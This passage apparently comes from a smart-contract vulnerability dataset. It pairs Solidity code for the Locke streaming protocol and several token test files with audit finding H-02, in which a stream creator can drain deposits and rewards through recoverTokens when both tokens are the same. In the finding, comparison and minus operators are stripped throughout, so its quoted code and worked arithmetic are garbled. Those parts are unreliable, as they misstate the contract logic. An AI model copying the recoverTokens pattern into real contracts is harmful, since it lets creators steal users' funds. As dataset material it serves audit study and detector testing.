GovernableFeeParams newParams);\n\n    constructor(address _governor, address _emergency_governor) public Governed(_governor, _emergency_governor) {\n        streamParams = GovernableStreamParams({\n            maxDepositLockDuration: 52 weeks,\n            maxRewardLockDuration: 52 weeks,\n            maxStreamDuration: 2 weeks,\n            minStreamDuration: 1 hours\n        });\n    }\n\n    /**\n     * @dev Deploys a minimal contract pointing to streaming logic. This contract will also be the token contract\n     * for the receipt token. It custodies the depositTokens until depositLockDuration is complete. After\n     * lockDuration is completed, the depositTokens can be claimed by the original depositors\n     * \n    **/\n    function createStream(\n        address rewardToken,\n        address depositToken,\n        uint32 startTime,\n        uint32 streamDuration,\n        uint32 depositLockDuration,\n        uint32 rewardLockDuration,\n        bool isSale\n    )\n        public\n        returns (Stream)\n    {\n        // perform checks\n\n        {\n            require(startTime >= block.timestamp, \"past\");\n            require(streamDuration >= streamParams.minStreamDuration && streamDuration <= streamParams.maxStreamDuration, \"stream\");\n            require(depositLockDuration <= streamParams.maxDepositLockDuration, \"lock\");\n            require(rewardLockDuration <= streamParams.maxRewardLockDuration, \"reward\");\n        }\n        \n\n        // TODO: figure out sane salt, i.e. streamid + x? streamid guaranteed to be unique\n        uint64 that_stream = currStreamId;\n        currStreamId += 1;\n        bytes32 salt = bytes32(uint256(that_stream));\n\n        Stream stream = new Stream{salt: salt}(\n            that_stream,\n            msg.sender,\n            isSale,\n            rewardToken,\n            depositToken,\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration,\n            feeParams.feePercent,\n            feeParams.feeEnabled\n        );\n\n        emit StreamCreated(that_stream, address(stream));\n\n        return stream;\n    }\n\n    function updateStreamParams(GovernableStreamParams memory newParams) public governed {\n        // DATA VALIDATION:\n        //  there is no real concept of \"sane\" limits here, and if misconfigured its ultimated\n        //  not a massive deal so no data validation is done\n        GovernableStreamParams memory old = streamParams;\n        streamParams = newParams;\n        emit StreamParametersUpdated(old, newParams);\n    }\n\n    function updateFeeParams(GovernableFeeParams memory newFeeParams) public governed {\n        require(newFeeParams.feePercent <= MAX_FEE_PERCENT, \"fee\");\n        GovernableFeeParams memory old = feeParams;\n        feeParams = newFeeParams;\n        emit FeeParametersUpdated(old, newFeeParams);\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.10;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {DSInvariantTest} from \"./utils/DSInvariantTest.sol\";\n\nimport {SafeTransferLib} from \"../utils/SafeTransferLib.sol\";\n\nimport {WETH} from \"../tokens/WETH.sol\";\n\ncontract WETHTest is DSTestPlus {\n    WETH weth;\n\n    function setUp() public {\n        weth = new WETH();\n    }\n\n    function testDeposit() public {\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        SafeTransferLib.safeTransferETH(address(weth), 1 ether);\n\n        assertEq(weth.balanceOf(address(this)), 1 ether);\n        assertEq(weth.totalSupply(), 1 ether);\n    }\n\n    function testFallbackDeposit() public {\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        weth.deposit{value: 1 ether}();\n\n        assertEq(weth.balanceOf(address(this)), 1 ether);\n        assertEq(weth.totalSupply(), 1 ether);\n    }\n\n    function testWithdraw() public {\n        uint256 startingBalance = address(this).balance;\n\n        weth.deposit{value: 1 ether}();\n\n        weth.withdraw(1 ether);\n\n        uint256 balanceAfterWithdraw = address(this).balance;\n\n        assertEq(balanceAfterWithdraw, startingBalance);\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n    }\n\n    function testPartialWithdraw() public {\n        weth.deposit{value: 1 ether}();\n\n        uint256 balanceBeforeWithdraw = address(this).balance;\n\n        weth.withdraw(0.5 ether);\n\n        uint256 balanceAfterWithdraw = address(this).balance;\n\n        assertEq(balanceAfterWithdraw, balanceBeforeWithdraw + 0.5 ether);\n        assertEq(weth.balanceOf(address(this)), 0.5 ether);\n        assertEq(weth.totalSupply(), 0.5 ether);\n    }\n\n    function testDeposit(uint256 amount) public {\n        if (amount > address(this).balance) return;\n\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        SafeTransferLib.safeTransferETH(address(weth), amount);\n\n        assertEq(weth.balanceOf(address(this)), amount);\n        assertEq(weth.totalSupply(), amount);\n    }\n\n    function testFallbackDeposit(uint256 amount) public {\n        if (amount > address(this).balance) return;\n\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        weth.deposit{value: amount}();\n\n        assertEq(weth.balanceOf(address(this)), amount);\n        assertEq(weth.totalSupply(), amount);\n    }\n\n    function testWithdraw(uint256 depositAmount, uint256 withdrawAmount) public {\n        if (depositAmount > address(this).balance) return;\n        if (withdrawAmount > depositAmount) return;\n\n        weth.deposit{value: depositAmount}();\n\n        uint256 balanceBeforeWithdraw = address(this).balance;\n\n        weth.withdraw(withdrawAmount);\n\n        uint256 balanceAfterWithdraw = address(this).balance;\n\n        assertEq(balanceAfterWithdraw, balanceBeforeWithdraw + withdrawAmount);\n        assertEq(weth.balanceOf(address(this)), depositAmount - withdrawAmount);\n        assertEq(weth.totalSupply(), depositAmount - withdrawAmount);\n    }\n\n    receive() external payable {}\n}\n\ncontract WETHInvariants is DSTestPlus, DSInvariantTest {\n    WETHTester wethTester;\n    WETH weth;\n\n    function setUp() public {\n        weth = new WETH();\n        wethTester = new WETHTester{value: address(this).balance}(weth);\n\n        addTargetContract(address(wethTester));\n    }\n\n    function invariantTotalSupplyEqualsBalance() public {\n        assertEq(address(weth).balance, weth.totalSupply());\n    }\n}\n\ncontract WETHTester {\n    WETH weth;\n\n    constructor(WETH _weth) payable {\n        weth = _weth;\n    }\n\n    function deposit(uint256 amount) public {\n        weth.deposit{value: amount}();\n    }\n\n    function fallbackDeposit(uint256 amount) public {\n        SafeTransferLib.safeTransferETH(address(weth), amount);\n    }\n\n    function withdraw(uint256 amount) public {\n        weth.withdraw(amount);\n    }\n\n    receive() external payable {}\n}\n\n\n// SPDX-License-Identifier: GPL-3.0-or-later\n\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// (at your option) any later version.\n\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n\n// You should have received a copy of the GNU General Public License\n// along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\npragma solidity >=0.4.23;\n\ncontract DSTest {\n    event log                    (string);\n    event logs                   (bytes);\n\n    event log_address            (address);\n    event log_bytes32            (bytes32);\n    event log_int                (int);\n    event log_uint               (uint);\n    event log_bytes              (bytes);\n    event log_string             (string);\n\n    event log_named_address      (string key, address val);\n    event log_named_bytes32      (string key, bytes32 val);\n    event log_named_decimal_int  (string key, int val, uint decimals);\n    event log_named_decimal_uint (string key, uint val, uint decimals);\n    event log_named_int          (string key, int val);\n    event log_named_uint         (string key, uint val);\n    event log_named_bytes        (string key, bytes val);\n    event log_named_string       (string key, string val);\n\n    bool public IS_TEST = true;\n    bool public failed;\n\n    address constant HEVM_ADDRESS =\n        address(bytes20(uint160(uint256(keccak256('hevm cheat code')))));\n\n    modifier mayRevert() { _; }\n    modifier testopts(string memory) { _; }\n\n    function fail() internal {\n        failed = true;\n    }\n\n    modifier logs_gas() {\n        uint startGas = gasleft();\n        _;\n        uint endGas = gasleft();\n        emit log_named_uint(\"gas\", startGas - endGas);\n    }\n\n    function assertTrue(bool condition) internal {\n        if (!condition) {\n            emit log(\"Error: Assertion Failed\");\n            fail();\n        }\n    }\n\n    function assertTrue(bool condition, string memory err) internal {\n        if (!condition) {\n            emit log_named_string(\"Error\", err);\n            assertTrue(condition);\n        }\n    }\n\n    function assertEq(address a, address b) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [address]\");\n            emit log_named_address(\"  Expected\", b);\n            emit log_named_address(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(address a, address b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string (\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEq(bytes32 a, bytes32 b) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [bytes32]\");\n            emit log_named_bytes32(\"  Expected\", b);\n            emit log_named_bytes32(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(bytes32 a, bytes32 b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string (\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n    function assertEq32(bytes32 a, bytes32 b) internal {\n        assertEq(a, b);\n    }\n    function assertEq32(bytes32 a, bytes32 b, string memory err) internal {\n        assertEq(a, b, err);\n    }\n\n    function assertEq(int a, int b) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [int]\");\n            emit log_named_int(\"  Expected\", b);\n            emit log_named_int(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(int a, int b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n    function assertEq(uint a, uint b) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [uint]\");\n            emit log_named_uint(\"  Expected\", b);\n            emit log_named_uint(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(uint a, uint b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n    function assertEqDecimal(int a, int b, uint decimals) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Expected\", b, decimals);\n            emit log_named_decimal_int(\"    Actual\", a, decimals);\n            fail();\n        }\n    }\n    function assertEqDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEqDecimal(a, b, decimals);\n        }\n    }\n    function assertEqDecimal(uint a, uint b, uint decimals) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Expected\", b, decimals);\n            emit log_named_decimal_uint(\"    Actual\", a, decimals);\n            fail();\n        }\n    }\n    function assertEqDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEqDecimal(a, b, decimals);\n        }\n    }\n\n    function assertGt(uint a, uint b) internal {\n        if (a <= b) {\n            emit log(\"Error: a > b not satisfied [uint]\");\n            emit log_named_uint(\"  Value a\", a);\n            emit log_named_uint(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertGt(uint a, uint b, string memory err) internal {\n        if (a <= b) {\n            emit log_named_string(\"Error\", err);\n            assertGt(a, b);\n        }\n    }\n    function assertGt(int a, int b) internal {\n        if (a <= b) {\n            emit log(\"Error: a > b not satisfied [int]\");\n            emit log_named_int(\"  Value a\", a);\n            emit log_named_int(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertGt(int a, int b, string memory err) internal {\n        if (a <= b) {\n            emit log_named_string(\"Error\", err);\n            assertGt(a, b);\n        }\n    }\n    function assertGtDecimal(int a, int b, uint decimals) internal {\n        if (a <= b) {\n            emit log(\"Error: a > b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Value a\", a, decimals);\n            emit log_named_decimal_int(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertGtDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a <= b) {\n            emit log_named_string(\"Error\", err);\n            assertGtDecimal(a, b, decimals);\n        }\n    }\n    function assertGtDecimal(uint a, uint b, uint decimals) internal {\n        if (a <= b) {\n            emit log(\"Error: a > b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Value a\", a, decimals);\n            emit log_named_decimal_uint(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertGtDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a <= b) {\n            emit log_named_string(\"Error\", err);\n            assertGtDecimal(a, b, decimals);\n        }\n    }\n\n    function assertGe(uint a, uint b) internal {\n        if (a < b) {\n            emit log(\"Error: a >= b not satisfied [uint]\");\n            emit log_named_uint(\"  Value a\", a);\n            emit log_named_uint(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertGe(uint a, uint b, string memory err) internal {\n        if (a < b) {\n            emit log_named_string(\"Error\", err);\n            assertGe(a, b);\n        }\n    }\n    function assertGe(int a, int b) internal {\n        if (a < b) {\n            emit log(\"Error: a >= b not satisfied [int]\");\n            emit log_named_int(\"  Value a\", a);\n            emit log_named_int(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertGe(int a, int b, string memory err) internal {\n        if (a < b) {\n            emit log_named_string(\"Error\", err);\n            assertGe(a, b);\n        }\n    }\n    function assertGeDecimal(int a, int b, uint decimals) internal {\n        if (a < b) {\n            emit log(\"Error: a >= b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Value a\", a, decimals);\n            emit log_named_decimal_int(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertGeDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a < b) {\n            emit log_named_string(\"Error\", err);\n            assertGeDecimal(a, b, decimals);\n        }\n    }\n    function assertGeDecimal(uint a, uint b, uint decimals) internal {\n        if (a < b) {\n            emit log(\"Error: a >= b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Value a\", a, decimals);\n            emit log_named_decimal_uint(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertGeDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a < b) {\n            emit log_named_string(\"Error\", err);\n            assertGeDecimal(a, b, decimals);\n        }\n    }\n\n    function assertLt(uint a, uint b) internal {\n        if (a >= b) {\n            emit log(\"Error: a < b not satisfied [uint]\");\n            emit log_named_uint(\"  Value a\", a);\n            emit log_named_uint(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertLt(uint a, uint b, string memory err) internal {\n        if (a >= b) {\n            emit log_named_string(\"Error\", err);\n            assertLt(a, b);\n        }\n    }\n    function assertLt(int a, int b) internal {\n        if (a >= b) {\n            emit log(\"Error: a < b not satisfied [int]\");\n            emit log_named_int(\"  Value a\", a);\n            emit log_named_int(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertLt(int a, int b, string memory err) internal {\n        if (a >= b) {\n            emit log_named_string(\"Error\", err);\n            assertLt(a, b);\n        }\n    }\n    function assertLtDecimal(int a, int b, uint decimals) internal {\n        if (a >= b) {\n            emit log(\"Error: a < b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Value a\", a, decimals);\n            emit log_named_decimal_int(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertLtDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a >= b) {\n            emit log_named_string(\"Error\", err);\n            assertLtDecimal(a, b, decimals);\n        }\n    }\n    function assertLtDecimal(uint a, uint b, uint decimals) internal {\n        if (a >= b) {\n            emit log(\"Error: a < b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Value a\", a, decimals);\n            emit log_named_decimal_uint(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertLtDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a >= b) {\n            emit log_named_string(\"Error\", err);\n            assertLtDecimal(a, b, decimals);\n        }\n    }\n\n    function assertLe(uint a, uint b) internal {\n        if (a > b) {\n            emit log(\"Error: a <= b not satisfied [uint]\");\n            emit log_named_uint(\"  Value a\", a);\n            emit log_named_uint(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertLe(uint a, uint b, string memory err) internal {\n        if (a > b) {\n            emit log_named_string(\"Error\", err);\n            assertLe(a, b);\n        }\n    }\n    function assertLe(int a, int b) internal {\n        if (a > b) {\n            emit log(\"Error: a <= b not satisfied [int]\");\n            emit log_named_int(\"  Value a\", a);\n            emit log_named_int(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertLe(int a, int b, string memory err) internal {\n        if (a > b) {\n            emit log_named_string(\"Error\", err);\n            assertLe(a, b);\n        }\n    }\n    function assertLeDecimal(int a, int b, uint decimals) internal {\n        if (a > b) {\n            emit log(\"Error: a <= b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Value a\", a, decimals);\n            emit log_named_decimal_int(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertLeDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a > b) {\n            emit log_named_string(\"Error\", err);\n            assertLeDecimal(a, b, decimals);\n        }\n    }\n    function assertLeDecimal(uint a, uint b, uint decimals) internal {\n        if (a > b) {\n            emit log(\"Error: a <= b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Value a\", a, decimals);\n            emit log_named_decimal_uint(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertLeDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a > b) {\n            emit log_named_string(\"Error\", err);\n            assertGeDecimal(a, b, decimals);\n        }\n    }\n\n    function assertEq(string memory a, string memory b) internal {\n        if (keccak256(abi.encodePacked(a)) != keccak256(abi.encodePacked(b))) {\n            emit log(\"Error: a == b not satisfied [string]\");\n            emit log_named_string(\"  Value a\", a);\n            emit log_named_string(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertEq(string memory a, string memory b, string memory err) internal {\n        if (keccak256(abi.encodePacked(a)) != keccak256(abi.encodePacked(b))) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function checkEq0(bytes memory a, bytes memory b) internal pure returns (bool ok) {\n        ok = true;\n        if (a.length == b.length) {\n            for (uint i = 0; i < a.length; i++) {\n                if (a[i] != b[i]) {\n                    ok = false;\n                }\n            }\n        } else {\n            ok = false;\n        }\n    }\n    function assertEq0(bytes memory a, bytes memory b) internal {\n        if (!checkEq0(a, b)) {\n            emit log(\"Error: a == b not satisfied [bytes]\");\n            emit log_named_bytes(\"  Expected\", a);\n            emit log_named_bytes(\"    Actual\", b);\n            fail();\n        }\n    }\n    function assertEq0(bytes memory a, bytes memory b, string memory err) internal {\n        if (!checkEq0(a, b)) {\n            emit log_named_string(\"Error\", err);\n            assertEq0(a, b);\n        }\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.10;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {DSInvariantTest} from \"./utils/DSInvariantTest.sol\";\n\nimport {MockERC20} from \"./utils/mocks/MockERC20.sol\";\nimport {ERC20User} from \"./utils/users/ERC20User.sol\";\n\ncontract ERC20Test is DSTestPlus {\n    MockERC20 token;\n\n    function setUp() public {\n        token = new MockERC20(\"Token\", \"TKN\", 18);\n    }\n\n    function invariantMetadata() public {\n        assertEq(token.name(), \"Token\");\n        assertEq(token.symbol(), \"TKN\");\n        assertEq(token.decimals(), 18);\n    }\n\n    function testMetaData(\n        string calldata name,\n        string calldata symbol,\n        uint8 decimals\n    ) public {\n        MockERC20 tkn = new MockERC20(name, symbol, decimals);\n        assertEq(tkn.name(), name);\n        assertEq(tkn.symbol(), symbol);\n        assertEq(tkn.decimals(), decimals);\n    }\n\n    function testMint(address from, uint256 amount) public {\n        token.mint(from, amount);\n\n        assertEq(token.totalSupply(), amount);\n        assertEq(token.balanceOf(from), amount);\n    }\n\n    function testBurn(\n        address from,\n        uint256 mintAmount,\n        uint256 burnAmount\n    ) public {\n        if (burnAmount > mintAmount) return;\n\n        token.mint(from, mintAmount);\n        token.burn(from, burnAmount);\n\n        assertEq(token.totalSupply(), mintAmount - burnAmount);\n        assertEq(token.balanceOf(from), mintAmount - burnAmount);\n    }\n\n    function testApprove(address from, uint256 amount) public {\n        assertTrue(token.approve(from, amount));\n\n        assertEq(token.allowance(address(this), from), amount);\n    }\n\n    function testTransfer(address from, uint256 amount) public {\n        token.mint(address(this), amount);\n\n        assertTrue(token.transfer(from, amount));\n        assertEq(token.totalSupply(), amount);\n\n        if (address(this) == from) {\n            assertEq(token.balanceOf(address(this)), amount);\n        } else {\n            assertEq(token.balanceOf(address(this)), 0);\n            assertEq(token.balanceOf(from), amount);\n        }\n    }\n\n    function testTransferFrom(\n        address to,\n        uint256 approval,\n        uint256 amount\n    ) public {\n        if (amount > approval) return;\n\n        ERC20User from = new ERC20User(token);\n\n        token.mint(address(from), amount);\n\n        from.approve(address(this), approval);\n\n        assertTrue(token.transferFrom(address(from), to, amount));\n        assertEq(token.totalSupply(), amount);\n\n        uint256 app = address(from) == address(this) || approval == type(uint256).max ? approval : approval - amount;\n        assertEq(token.allowance(address(from), address(this)), app);\n\n        if (address(from) == to) {\n            assertEq(token.balanceOf(address(from)), amount);\n        } else {\n            assertEq(token.balanceOf(address(from)), 0);\n            assertEq(token.balanceOf(to), amount);\n        }\n    }\n\n    function testFailTransferFromInsufficientAllowance(\n        address to,\n        uint256 approval,\n        uint256 amount\n    ) public {\n        require(approval < amount);\n\n        ERC20User from = new ERC20User(token);\n\n        token.mint(address(from), amount);\n        from.approve(address(this), approval);\n        token.transferFrom(address(from), to, amount);\n    }\n\n    function testFailTransferFromInsufficientBalance(\n        address to,\n        uint256 mintAmount,\n        uint256 sendAmount\n    ) public {\n        require(mintAmount < sendAmount);\n\n        ERC20User from = new ERC20User(token);\n\n        token.mint(address(from), mintAmount);\n        from.approve(address(this), sendAmount);\n        token.transferFrom(address(from), to, sendAmount);\n    }\n}\n\ncontract ERC20Invariants is DSTestPlus, DSInvariantTest {\n    BalanceSum balanceSum;\n    MockERC20 token;\n\n    function setUp() public {\n        token = new MockERC20(\"Token\", \"TKN\", 18);\n        balanceSum = new BalanceSum(token);\n\n        addTargetContract(address(balanceSum));\n    }\n\n    function invariantBalanceSum() public {\n        assertEq(token.totalSupply(), balanceSum.sum());\n    }\n}\n\ncontract BalanceSum {\n    MockERC20 token;\n    uint256 public sum;\n\n    constructor(MockERC20 _token) {\n        token = _token;\n    }\n\n    function mint(address from, uint256 amount) public {\n        token.mint(from, amount);\n        sum += amount;\n    }\n\n    function burn(address from, uint256 amount) public {\n        token.burn(from, amount);\n        sum -= amount;\n    }\n\n    function approve(address to, uint256 amount) public {\n        token.approve(to, amount);\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public {\n        token.transferFrom(from, to, amount);\n    }\n\n    function transfer(address to, uint256 amount) public {\n        token.transfer(to, amount);\n    }\n}\n\n\n",
        "CodeNames": [
            "Locke.sol",
            "WETH.t.sol",
            "test.sol",
            "ERC20.t.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-02",
                "Location": [
                    "//solidity\nfunction recoverTokens(address token, address recipient) public lock {\n    // NOTE: it is the stream creators responsibility to save\n    // tokens on behalf of their users.\n    require(msg.sender == streamCreator, \"!creator\");\n    if (token == depositToken) {\n        require(block.timestamp  endDepositLock, \"time\");\n        // get the balance of this contract\n        // check what isnt claimable by either party\n        // @audit-info depositTokenAmount updated on stake/withdraw/exit, redeemedDepositTokens increased on claimDepositTokens\n        uint256 excess = ERC20(token).balanceOf(address(this)) (depositTokenAmount redeemedDepositTokens);\n        // allow saving of the token\n        ERC20(token).safeTransfer(recipient, excess);\n\n        emit RecoveredTokens(token, recipient, excess);\n        return;\n    }\n    \n    if (token == rewardToken) {\n        require(block.timestamp  endRewardLock, \"time\");\n        // check current balance vs internal balance\n        //\n        // NOTE: if a token rebases, i.e. changes balance out from under us,\n        // most of this contract breaks and rugs depositors. this isn't exclusive\n        // to this function but this function would in theory allow someone to rug\n        // and recover the excess (if it is worth anything)\n\n        // check what isnt claimable by depositors and governance\n        // @audit-info rewardTokenAmount increased on fundStream\n        uint256 excess = ERC20(token).balanceOf(address(this)) (rewardTokenAmount + rewardTokenFeeAmount);\n        ERC20(token).safeTransfer(recipient, excess);\n\n        emit RecoveredTokens(token, recipient, excess);\n        return;\n    }\n    // ...\n"
                ],
                "Type": " Tokens can be stolen when  depositToken == rewardToken ",
                "Description": "\nThe Streaming contract allows the deposit and reward tokens to be the same token.\n\n I believe this is intended, think Sushi reward on Sushi as is the case with xSushi.\n\nThe reward and deposit balances are also correctly tracked independently in depositTokenAmount and rewardTokenAmount.\nHowever, when recovering tokens this leads to issues as the token is recovered twice, once for deposits and another time for rewards:\n\nsolidity\nfunction recoverTokens(address token, address recipient) public lock {\n    // NOTE: it is the stream creators responsibility to save\n    // tokens on behalf of their users.\n    require(msg.sender == streamCreator, \"!creator\");\n    if (token == depositToken) {\n        require(block.timestamp  endDepositLock, \"time\");\n        // get the balance of this contract\n        // check what isnt claimable by either party\n        // @audit-info depositTokenAmount updated on stake/withdraw/exit, redeemedDepositTokens increased on claimDepositTokens\n        uint256 excess = ERC20(token).balanceOf(address(this)) (depositTokenAmount redeemedDepositTokens);\n        // allow saving of the token\n        ERC20(token).safeTransfer(recipient, excess);\n\n        emit RecoveredTokens(token, recipient, excess);\n        return;\n    }\n    \n    if (token == rewardToken) {\n        require(block.timestamp  endRewardLock, \"time\");\n        // check current balance vs internal balance\n        //\n        // NOTE: if a token rebases, i.e. changes balance out from under us,\n        // most of this contract breaks and rugs depositors. this isn't exclusive\n        // to this function but this function would in theory allow someone to rug\n        // and recover the excess (if it is worth anything)\n\n        // check what isnt claimable by depositors and governance\n        // @audit-info rewardTokenAmount increased on fundStream\n        uint256 excess = ERC20(token).balanceOf(address(this)) (rewardTokenAmount + rewardTokenFeeAmount);\n        ERC20(token).safeTransfer(recipient, excess);\n\n        emit RecoveredTokens(token, recipient, excess);\n        return;\n    }\n    // ...\n\n\n\nGiven recoverTokens == depositToken, Stream creator calls recoverTokens(token = depositToken, creator).\n\n*   The token balance is the sum of deposited tokens (minus reclaimed) plus the reward token amount. ERC20(token).balanceOf(address(this)) = (depositTokenAmount redeemedDepositTokens) + (rewardTokenAmount + rewardTokenFeeAmount)\n*   if (token == depositToken) executes, the excess from the deposit amount will be the reward amount (excess = rewardTokenAmount + rewardTokenFeeAmount). This will be transferred.\n*   if (token == rewardToken) executes, the new token balance is just the deposit token amount now (because the reward token amount has been transferred out in the step before). Therefore, ERC20(token).balanceOf(address(this)) = depositTokenAmount redeemedDepositTokens. If this is non-negative, the transaction does not revert and the creator makes a profit.\n\nExample:\n\n*   outstanding redeemable deposit token amount: depositTokenAmount redeemedDepositTokens = 1000\n*   funded rewardTokenAmount (plus rewardTokenFeeAmount fees): rewardTokenAmount + rewardTokenFeeAmount = 500\n\nCreator receives 1500 1000 = 500 excess deposit and 1000 500 = 500 excess reward.\n\n\nWhen using the same deposit and reward token, the stream creator can steal tokens from the users who will be unable to withdraw their profit or claim their rewards.\n\n",
                "Repair": "\nOne needs to be careful with using .balanceOf in this special case as it includes both deposit and reward balances.\n\nAdd a special case for recoverTokens when token == depositToken == rewardToken and then the excess should be ERC20(token).balanceOf(address(this)) (depositTokenAmount redeemedDepositTokens) (rewardTokenAmount + rewardTokenFeeAmount);\n\nbrockelmore (Streaming Protocol) confirmed(https://github.com/code-423n4/2021-11-streaming-findings/issues/215#issuecomment-989276002)\n\n\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.0;\n\nimport \"./LockeERC20.sol\";\nimport \"solmate/utils/SafeTransferLib.sol\";\nimport \"solmate/tokens/ERC20.sol\";\n\n// ====== Governance =====\ncontract Governed {\n    address public gov;\n    address private pendingGov;\n    address public emergency_gov;\n\n    event NewGov(address indexed oldGov, address indexed newGov);\n    event NewPendingGov(address indexed oldPendingGov, address indexed newPendingGov);\n\n    constructor(address _governor, address _emergency_governor) public {\n        gov = _governor;\n        emergency_gov = _emergency_governor;\n    }\n\n    function governorship() public view returns (address, address, address) {\n        return (gov, emergency_gov, pendingGov);\n    }\n\n    /// Update pending governor\n    function setPendingGov(address newPendingGov) governed public {\n        address old = pendingGov;\n        pendingGov = newPendingGov;\n        emit NewPendingGov(old, newPendingGov);\n    }\n\n    /// Accepts governorship\n    function acceptGov() public {\n        require(pendingGov == msg.sender, \"!pending\");\n        address old = gov;\n        gov = pendingGov;\n        emit NewGov(old, pendingGov);\n    }\n\n    function setEmergencyGov(address who) public governed {\n        emergency_gov = who;\n    } \n\n    /// Remove governor\n    function __abdicate() governed public {\n        address old = gov;\n        gov = address(0);\n        emit NewGov(old, address(0));\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier governed {\n        require(msg.sender == gov, \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier emergency_governed {\n        require(msg.sender == gov || msg.sender == emergency_gov, \"!egov\");\n        _;\n    }\n}\n\ninterface IGoverned {\n    function gov() external view returns (address);\n    function emergency_gov() external view returns (address);\n}\n\nabstract contract ExternallyGoverned {\n    IGoverned public gov;\n\n    constructor(address governor) {\n        gov = IGoverned(governor);\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier externallyGoverned {\n        require(msg.sender == gov.gov(), \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier externallyEmergencyGoverned {\n        require(msg.sender == gov.gov() || msg.sender == gov.emergency_gov(), \"!e_gov\");\n        _;\n    }\n}\n\ninterface LockeCallee {\n    function lockeCall(address initiator, address token, uint256 amount, bytes calldata data) external;\n}\n\n// ====== Stream =====\ncontract Stream is LockeERC20, ExternallyGoverned {\n    using SafeTransferLib for ERC20;    \n    // ======= Structs ========\n    struct TokenStream {\n        uint256 lastCumulativeRewardPerToken;\n        uint256 virtualBalance;\n        uint112 rewards;\n        uint112 tokens;\n        uint32 lastUpdate;\n        bool merkleAccess;\n 